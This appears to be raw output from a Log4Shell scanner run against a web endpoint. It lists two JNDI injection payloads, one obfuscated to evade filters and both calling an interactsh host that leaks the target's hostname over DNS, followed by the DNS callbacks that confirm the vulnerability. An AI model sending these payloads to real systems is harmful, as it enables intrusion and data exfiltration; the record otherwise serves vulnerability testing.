[*] Current configuration
    [•] Enable proxy http://127.0.0.1:8080 successfully!
    [•] Payload injection mode: Injects each payloads to headers and data sequently.
    [•] Thread: 10
    [•] Excluded headers: connection, content-length, host, accept, accept-encoding, accept-language

[*] Loaded payload list
    [•] log4j_cve11:        ${jndi:ldap://${hostName}.origin.__param__.__interactsh_url__}
    [•] log4j_cve22:        ${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.__interactsh_url__/a}


====================================================================================================================================================================================


[*] Request details
    [•] URL: http://13.250.112.201:8001/
    [•] Method: POST
    [•] Headers added: User-Agent

[*] Registered interactsh successfully
    [•] Interact URL: rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh

[*] Waiting for a response(up to 20 seconds)...

[*] Detect log4j vulnerability
[*] Polled results from the interact server:

ID: 1   | Time: 2022-03-04T05:04:47.587610758Z   | Type: dns   | IP: 3.0.5.229        | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 2   | Time: 2022-03-04T05:04:47.588776309Z   | Type: dns   | IP: 13.229.187.213   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 3   | Time: 2022-03-04T05:04:47.589386015Z   | Type: dns   | IP: 13.229.187.218   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 4   | Time: 2022-03-04T05:04:47.59183784Z    | Type: dns   | IP: 18.140.177.41    | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 5   | Time: 2022-03-04T05:04:47.825756677Z   | Type: dns   | IP: 3.0.5.229        | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 6   | Time: 2022-03-04T05:04:47.827046703Z   | Type: dns   | IP: 13.229.187.218   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 7   | Time: 2022-03-04T05:04:47.963914395Z   | Type: dns   | IP: 3.0.5.229        | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 8   | Time: 2022-03-04T05:04:47.965752438Z   | Type: dns   | IP: 13.229.187.218   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 9   | Time: 2022-03-04T05:04:48.203531535Z   | Type: dns   | IP: 13.250.186.208   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 10  | Time: 2022-03-04T05:04:48.204007575Z   | Type: dns   | IP: 13.250.186.208   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 11  | Time: 2022-03-04T05:04:48.205036031Z   | Type: dns   | IP: 13.229.187.207   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 12  | Time: 2022-03-04T05:04:48.206314622Z   | Type: dns   | IP: 3.0.5.231        | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 13  | Time: 2022-03-04T05:04:48.206040564Z   | Type: dns   | IP: 13.229.187.194   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
